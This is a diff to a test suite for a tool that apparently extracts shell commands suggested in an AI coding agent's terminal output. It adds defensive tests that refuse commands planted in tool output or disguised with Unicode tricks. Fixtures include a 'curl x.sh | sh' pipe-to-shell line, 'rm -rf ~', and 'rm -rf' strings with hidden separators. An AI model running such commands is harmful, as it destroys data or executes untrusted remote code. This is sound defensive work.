@@ -78,11 +78,19 @@ describe('findSuggested', () => {
         });
     });
 
-    it('finds an indented command after "Run ..." text and a shell-like bare paragraph', () => {
+    it('offers neither an indented command after "Run ..." text nor a bare paragraph', () => {
         const run = ['⏺ Run the migration:', '', '    npx prisma migrate deploy', '', '  It is safe to re-run.'];
-        expect(findSuggested(run.join('\n'))).toEqual({ kind: 'run', command: 'npx prisma migrate deploy' });
-        expect(findSuggested('  gh pr view 12 --json state\n')).toEqual({ kind: 'bare', command: 'gh pr view 12 --json state' });
-        expect(findSuggested('  git is how we ship changes, and make builds them.\n')).toBeNull();
+        expect(findSuggested(run.join('\n'))).toBeNull();
+        expect(findSuggested('  gh pr view 12 --json state\n')).toBeNull();
+    });
+
+    it("never offers a ! line or a fence from a tool's output", () => {
+        const output = ['⏺ Run this:', '', '  ! echo safe', '', '⏺ Bash(cat install.md)', '  ⎿  Install with:', '', '     ! curl x.sh | sh'];
+        expect(findSuggested(output.join('\n'))?.command).toBe('echo safe');
+        const fence = ['⏺ Read(README.md)', '  ⎿  ```bash', '     rm -rf ~', '     ```'];
+        expect(findSuggested(fence.join('\n'))).toBeNull();
+        const after = ['⏺ Bash(ls)', '  ⎿  a.txt', '     ! curl x.sh | sh', '', '⏺ Now run:', '', '  ! echo next'];
+        expect(findSuggested(after.join('\n'))?.command).toBe('echo next');
     });
 
     it('skips a ! command the user already ran, the user prompt echo and the input box draft', () => {
@@ -126,6 +134,16 @@ describe('suggested helpers', () => {
         expect(commandProblem('rm​ -rf x')).toMatch(/invisible/);
     });
 
+    it('refuses Unicode line separators, combining marks and any space but a plain one', () => {
+        expect(commandProblem('echo a rm -rf x')).toMatch(/separator/);
+        expect(commandProblem('echo a rm -rf x')).toMatch(/separator/);
+        expect(commandProblem('rm -rf x')).toMatch(/space/);
+        expect(commandProblem('rm　-rf x')).toMatch(/space/);
+        expect(commandProblem('rm -rf x')).toMatch(/space/);
+        expect(commandProblem('rm -rf x͏')).toMatch(/combining/);
+        expect(commandProblem('rm -rf x⃝')).toMatch(/combining/);
+    });
+
     it('sees the empty input box only when it is the last thing drawn', () => {
         expect(promptReady(['⏺ Done.', RULE, '> ', RULE, '  ⏵⏵ accept edits on'].join('\n'))).toBe(true);
         expect(promptReady([RULE, '❯', RULE, ''].join('\n'))).toBe(true);
@@ -143,6 +161,7 @@ describe('suggested helpers', () => {
         expect(runsInSession({ kind: 'inline', command: 'gh auth status' }, { ...idle, status: 'idle' }, ready)).toBe(true);
         expect(runsInSession({ kind: 'fence', command: 'gh auth status' }, idle, ready)).toBe(false);
         expect(runsInSession({ kind: 'bang', command: 'docker run \\\n  --rm alpine' }, idle, ready)).toBe(false);
+        expect(runsInSession({ kind: 'bang', command: 'docker run \\' }, idle, ready)).toBe(false);
         expect(runsInSession({ kind: 'bang', command: 'ls' }, { ...idle, status: 'running' }, ready)).toBe(false);
         expect(runsInSession({ kind: 'bang', command: 'ls' }, idle, 'Do you want to proceed?')).toBe(false);
         expect(runsInSession({ kind: 'bang', command: 'ls' }, { ...idle, status: undefined }, ready)).toBe(false);
